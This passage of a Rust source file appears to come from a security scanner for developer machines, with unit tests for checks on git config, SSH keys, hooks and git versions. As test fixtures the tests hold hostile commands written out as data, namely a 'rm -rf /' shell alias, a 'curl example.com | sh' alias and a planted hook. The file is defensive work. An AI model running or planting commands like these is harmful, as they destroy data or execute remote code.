        .find(|(line, _)| *line == minor)
        .is_some_and(|(_, fixed)| patch >= *fixed)
}

// ---------------------------------------------------------------------------
// Project policy
// ---------------------------------------------------------------------------

pub(super) fn project_policy(ctx: &ControlContext<'_>) -> ControlAssessment {
    let path = ctx
        .report
        .roots
        .iter()
        .map(|root| root.join(".husk/policy.toml"))
        .find(|path| path.is_file());
    assessment(
        "project-policy",
        if path.is_some() {
            ControlStatus::Passed
        } else {
            ControlStatus::Failed
        },
        vec![evidence(
            if path.is_some() {
                "A project policy was found"
            } else {
                "No project policy was found at the scan roots"
            },
            path,
        )],
        Vec::new(),
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::guide::control::report_with_home;
    use crate::model::{Finding, ScanReport};

    fn run(
        control: fn(&ControlContext<'_>) -> ControlAssessment,
        report: &ScanReport,
    ) -> ControlAssessment {
        control(&ControlContext { report })
    }

    /// The parser stands in for `git config --list`, so it has to agree with it
    /// on how a key is spelled: section and key lowercased, subsection case
    /// kept, a bare key meaning true.
    #[test]
    fn git_config_is_parsed_the_way_git_lists_it() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config");
        std::fs::write(
            &path,
            "# a comment\n\
             [core]\n\
             \thooksPath = ~/.git-templates/hooks\n\
             \tfsmonitor\n\
             [remote \"Origin\"]\n\
             \turl = \"https://example.invalid/repo.git\"\n\
             [alias]\n\
             \tpanic = !sh -c 'rm -rf /'\n",
        )
        .unwrap();

        let entries = git_config_file(&path).expect("parsed");
        assert_eq!(
            config_value(&entries, "core.hookspath"),
            Some("~/.git-templates/hooks")
        );
        assert_eq!(
            config_value(&entries, "core.fsmonitor"),
            Some("true"),
            "a key with no value is git's boolean shorthand"
        );
        assert_eq!(
            config_value(&entries, "remote.Origin.url"),
            Some("https://example.invalid/repo.git"),
            "the subsection keeps its case while the section does not"
        );
        assert_eq!(
            config_value(&entries, "alias.panic"),
            Some("!sh -c 'rm -rf /'"),
            "a shell alias must survive intact for the execution probe to see it"
        );
    }

    fn base64_encode(bytes: &[u8]) -> String {
        const TABLE: &[u8; 64] =
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for chunk in bytes.chunks(3) {
            let b = [
                chunk[0],
                *chunk.get(1).unwrap_or(&0),
                *chunk.get(2).unwrap_or(&0),
            ];
            let n = (u32::from(b[0]) << 16) | (u32::from(b[1]) << 8) | u32::from(b[2]);
            out.push(TABLE[(n >> 18) as usize & 63] as char);
            out.push(TABLE[(n >> 12) as usize & 63] as char);
            out.push(if chunk.len() > 1 {
                TABLE[(n >> 6) as usize & 63] as char
            } else {
                '='
            });
            out.push(if chunk.len() > 2 {
                TABLE[n as usize & 63] as char
            } else {
                '='
            });
        }
        out
    }

    /// A minimal OpenSSH private-key armor whose decoded blob carries the
    /// magic and the named cipher, built by hand so tests never need
    /// ssh-keygen.
    fn openssh_key(cipher: &str) -> String {
        let mut blob = b"openssh-key-v1\0".to_vec();
        blob.extend(u32::try_from(cipher.len()).unwrap().to_be_bytes());
        blob.extend(cipher.as_bytes());
        format!(
            "-----BEGIN OPENSSH PRIVATE KEY-----\n{}\n-----END OPENSSH PRIVATE KEY-----\n",
            base64_encode(&blob)
        )
    }

    fn home_with_ssh() -> (tempfile::TempDir, PathBuf) {
        let dir = tempfile::tempdir().unwrap();
        let ssh = dir.path().join(".ssh");
        std::fs::create_dir_all(&ssh).unwrap();
        (dir, ssh)
    }

    #[test]
    fn ssh_passphrase_reads_the_cipher_from_the_key_armor() {
        let (home, ssh) = home_with_ssh();
        let report = report_with_home(home.path());

        std::fs::write(ssh.join("id_test"), openssh_key("none")).unwrap();
        assert_eq!(
            run(ssh_passphrase, &report).status,
            ControlStatus::Failed,
            "cipher none is an unencrypted key"
        );

        std::fs::write(ssh.join("id_test"), openssh_key("aes256-ctr")).unwrap();
        let passed = run(ssh_passphrase, &report);
        assert_eq!(passed.status, ControlStatus::Passed);
        assert!(
            passed.evidence[0].summary.contains("aes256-ctr"),
            "evidence names the cipher, never key material"
        );

        std::fs::remove_file(ssh.join("id_test")).unwrap();
        assert_eq!(
            run(ssh_passphrase, &report).status,
            ControlStatus::NotApplicable
        );
    }

    #[test]
    fn legacy_pem_encryption_is_read_from_the_proc_type_header() {
        let encrypted = "-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC\n\nAAAA\n-----END RSA PRIVATE KEY-----\n";
        assert!(matches!(
            key_protection(encrypted),
            Some(KeyProtection::Encrypted(_))
        ));
        let plaintext = "-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----\n";
        assert!(matches!(
            key_protection(plaintext),
            Some(KeyProtection::Plaintext(_))
        ));
        assert!(key_protection("ssh-ed25519 AAAA comment\n").is_none());
    }

    #[test]
    fn ssh_config_flags_directives_with_their_host_block() {
        let (home, ssh) = home_with_ssh();
        let report = report_with_home(home.path());

        assert_eq!(
            run(ssh_config, &report).status,
            ControlStatus::NotApplicable
        );

        std::fs::write(
            ssh.join("config"),
            "Host *\n  ForwardAgent yes\n  StrictHostKeyChecking no\nHost work\n  PermitLocalCommand yes\n  LocalCommand echo hi\n",
        )
        .unwrap();
        let failed = run(ssh_config, &report);
        assert_eq!(failed.status, ControlStatus::Failed);
        assert_eq!(failed.evidence.len(), 3);
        assert!(failed.evidence[0].summary.contains("Host *"));
        assert!(
            failed
                .evidence
                .iter()
                .any(|row| row.summary.contains("PermitLocalCommand")
                    && row.summary.contains("work"))
        );

        std::fs::write(
            ssh.join("config"),
            "Host *\n  StrictHostKeyChecking accept-new\n  ForwardAgent no\n",
        )
        .unwrap();
        assert_eq!(run(ssh_config, &report).status, ControlStatus::Passed);
    }

    #[cfg(unix)]
    #[test]
    fn ssh_permissions_fail_on_loose_key_and_pass_on_owner_only() {
        use std::os::unix::fs::PermissionsExt;
        let (home, ssh) = home_with_ssh();
        let report = report_with_home(home.path());
        let key = ssh.join("id_test");
        std::fs::write(&key, openssh_key("aes256-ctr")).unwrap();
        std::fs::set_permissions(&ssh, std::fs::Permissions::from_mode(0o700)).unwrap();
        std::fs::set_permissions(&key, std::fs::Permissions::from_mode(0o600)).unwrap();
        assert_eq!(run(ssh_permissions, &report).status, ControlStatus::Passed);

        std::fs::set_permissions(&key, std::fs::Permissions::from_mode(0o644)).unwrap();
        let failed = run(ssh_permissions, &report);
        assert_eq!(failed.status, ControlStatus::Failed);
        assert!(failed.evidence[0].summary.contains("644"));
    }

    #[test]
    fn hardware_key_grades_fido2_touch_over_software_and_weak_keys() {
        let (home, ssh) = home_with_ssh();
        let report = report_with_home(home.path());

        assert_eq!(
            run(hardware_key, &report).status,
            ControlStatus::NotApplicable
        );

        std::fs::write(ssh.join("id_rsa.pub"), "ssh-rsa AAAAB3Nza dev@host\n").unwrap();
        assert_eq!(run(hardware_key, &report).status, ControlStatus::Failed);

        std::fs::write(
            ssh.join("id_ed25519.pub"),
            "ssh-ed25519 AAAAC3Nza dev@host\n",
        )
        .unwrap();
        assert_eq!(run(hardware_key, &report).status, ControlStatus::Partial);

        std::fs::remove_file(ssh.join("id_rsa.pub")).unwrap();
        std::fs::write(
            ssh.join("id_sk.pub"),
            "sk-ssh-ed25519@openssh.com AAAAGnNr dev@host\n",
        )
        .unwrap();
        assert_eq!(run(hardware_key, &report).status, ControlStatus::Passed);

        std::fs::write(
            ssh.join("id_sk.pub"),
            "no-touch-required sk-ssh-ed25519@openssh.com AAAAGnNr dev@host\n",
        )
        .unwrap();
        assert_eq!(
            run(hardware_key, &report).status,
            ControlStatus::Partial,
            "no-touch-required removes the presence check"
        );
    }

    #[test]
    fn git_hooks_fails_on_findings_and_passes_on_a_clean_repo() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".git")).unwrap();
        let mut report = report_with_home(dir.path());
        report.roots = vec![dir.path().to_path_buf()];
        assert_eq!(run(git_hooks, &report).status, ControlStatus::Passed);

        report.findings = vec![Finding::from_rule("git-hook").id("git-hook:test")];
        assert_eq!(run(git_hooks, &report).status, ControlStatus::Failed);

        let empty = report_with_home(dir.path());
        assert_eq!(run(git_hooks, &empty).status, ControlStatus::NotApplicable);
    }

    #[test]
    fn template_hijack_reports_planted_hooks_and_passes_when_unset() {
        let dir = tempfile::tempdir().unwrap();
        let report = report_with_home(dir.path());
        assert_eq!(run(template_hijack, &report).status, ControlStatus::Passed);

        let template = dir.path().join("templates");
        let hooks = template.join("hooks");
        std::fs::create_dir_all(&hooks).unwrap();
        std::fs::write(
            dir.path().join(".gitconfig"),
            format!("[init]\n\ttemplateDir = {}\n", template.display()),
        )
        .unwrap();
        assert_eq!(
            run(template_hijack, &report).status,
            ControlStatus::Partial,
            "set but with no executable hooks"
        );

        let hook = hooks.join("post-checkout");
        std::fs::write(&hook, "#!/bin/sh\necho pwned\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let failed = run(template_hijack, &report);
        assert_eq!(failed.status, ControlStatus::Failed);
        assert!(failed.evidence[0].summary.contains("post-checkout"));
    }

    #[test]
    fn config_execution_reads_the_repo_local_config_directly() {
        let home = tempfile::tempdir().unwrap();
        let repo = home.path().join("project");
        std::fs::create_dir_all(repo.join(".git")).unwrap();
        let mut report = report_with_home(home.path());
        report.roots = vec![repo.clone()];

        std::fs::write(repo.join(".git/config"), "[core]\n\tbare = false\n").unwrap();
        assert_eq!(run(config_execution, &report).status, ControlStatus::Passed);

        std::fs::write(
            repo.join(".git/config"),
            "[core]\n\tfsmonitor = .hidden/watcher.sh\n[alias]\n\tst = !curl example.com | sh\n[core]\n\tfsmonitor2 = x\n",
        )
        .unwrap();
        let failed = run(config_execution, &report);
        assert_eq!(failed.status, ControlStatus::Failed);
        assert!(
            failed
                .evidence
                .iter()
                .any(|row| row.summary.contains("core.fsmonitor"))
        );
        assert!(
            failed
                .evidence
                .iter()
                .any(|row| row.summary.contains("alias.st"))
        );

        // The builtin-fsmonitor bool is a toggle, not a command.
        std::fs::write(repo.join(".git/config"), "[core]\n\tfsmonitor = true\n").unwrap();
        assert_eq!(run(config_execution, &report).status, ControlStatus::Passed);

        let no_repos = report_with_home(home.path());
        assert_eq!(
            run(config_execution, &no_repos).status,
            ControlStatus::NotApplicable
        );
    }

    #[test]
    fn integrity_config_requires_fsck_and_flags_unsafe_overrides() {
        let home = tempfile::tempdir().unwrap();
        let report = report_with_home(home.path());

        // No global config at all: fsckObjects is off by default.
        let failed = run(integrity_config, &report);
        assert_eq!(failed.status, ControlStatus::Failed);
        assert!(failed.evidence[0].summary.contains("transfer.fsckObjects"));

        std::fs::write(
            home.path().join(".gitconfig"),
            "[transfer]\n\tfsckObjects = true\n",
        )
        .unwrap();
        assert_eq!(run(integrity_config, &report).status, ControlStatus::Passed);

        std::fs::write(
            home.path().join(".gitconfig"),
            "[transfer]\n\tfsckObjects = true\n[safe]\n\tdirectory = *\n",
        )
        .unwrap();
        let unsafe_dir = run(integrity_config, &report);
        assert_eq!(unsafe_dir.status, ControlStatus::Failed);
        assert!(unsafe_dir.evidence[0].summary.contains("safe.directory"));
    }

    #[test]
    fn integrity_config_redacts_credentials_embedded_in_remote_urls() {
        let home = tempfile::tempdir().unwrap();
        let repo = home.path().join("project");
        std::fs::create_dir_all(repo.join(".git")).unwrap();
        std::fs::write(
            home.path().join(".gitconfig"),
            "[transfer]\n\tfsckObjects = true\n",
        )
        .unwrap();
        std::fs::write(
            repo.join(".git/config"),
            "[remote \"origin\"]\n\turl = https://user:sekrit@example.com/repo.git\n",
        )
        .unwrap();
        let mut report = report_with_home(home.path());
        report.roots = vec![repo];
        let failed = run(integrity_config, &report);
        assert_eq!(failed.status, ControlStatus::Failed);
        assert!(failed.evidence[0].summary.contains("embeds a credential"));
        assert!(
            !failed.evidence[0].summary.contains("sekrit"),
            "the credential itself is never echoed"
        );

        assert!(url_embeds_credential("https://user:tok@example.com/x.git"));
        assert!(!url_embeds_credential("https://example.com/x.git"));
        assert!(!url_embeds_credential("git@github.com:owner/repo.git"));
    }

    #[test]
    fn signed_commits_needs_local_verifiability_not_just_the_toggle() {
        let home = tempfile::tempdir().unwrap();
        let report = report_with_home(home.path());
        assert_eq!(run(signed_commits, &report).status, ControlStatus::Failed);

        std::fs::write(
            home.path().join(".gitconfig"),
            "[commit]\n\tgpgsign = true\n[gpg]\n\tformat = ssh\n",
        )
        .unwrap();
        let partial = run(signed_commits, &report);
        assert_eq!(
            partial.status,
            ControlStatus::Partial,
            "ssh signing without an allowed-signers file cannot be verified locally"
        );

        std::fs::write(
            home.path().join(".gitconfig"),
            "[commit]\n\tgpgsign = true\n[gpg]\n\tformat = ssh\n[user]\n\tsigningkey = ~/.ssh/id_ed25519.pub\n[gpg \"ssh\"]\n\tallowedSignersFile = ~/.ssh/allowed_signers\n",
        )
        .unwrap();
        assert_eq!(run(signed_commits, &report).status, ControlStatus::Passed);
    }

    #[test]
    fn clone_rce_backport_table_is_applied_per_minor_line() {
        assert!(!clone_rce_fixed(2, 45, 0));
        assert!(clone_rce_fixed(2, 45, 1));
        assert!(!clone_rce_fixed(2, 39, 3));
        assert!(clone_rce_fixed(2, 39, 4));
        assert!(clone_rce_fixed(2, 46, 0));
        assert!(clone_rce_fixed(2, 50, 2));
        assert!(!clone_rce_fixed(2, 38, 9), "older lines have no fix");
        assert!(!clone_rce_fixed(1, 9, 9));

        assert_eq!(parse_git_version("git version 2.45.1"), Some((2, 45, 1)));
        assert_eq!(
            parse_git_version("git version 2.47.1.windows.1"),
            Some((2, 47, 1))
        );
        assert_eq!(
            parse_git_version("git version 2.39.3 (Apple Git-146)"),
            Some((2, 39, 3))
        );
        assert_eq!(parse_git_version("no digits here"), None);
    }

    #[test]
    fn client_version_passes_against_the_dev_shell_git() {
        // The development environment ships a current git, well past every
        // backport in the table; this exercises the whole probe end to end.
        let report = report_with_home(Path::new("/"));
        assert_eq!(run(client_version, &report).status, ControlStatus::Passed);
    }

    #[test]
    fn project_policy_is_found_at_a_scan_root() {
        let dir = tempfile::tempdir().unwrap();
        let mut report = report_with_home(dir.path());
        report.roots = vec![dir.path().to_path_buf()];
        assert_eq!(run(project_policy, &report).status, ControlStatus::Failed);

        std::fs::create_dir_all(dir.path().join(".husk")).unwrap();
        std::fs::write(dir.path().join(".husk/policy.toml"), "[policy]\n").unwrap();
        assert_eq!(run(project_policy, &report).status, ControlStatus::Passed);
    }
}
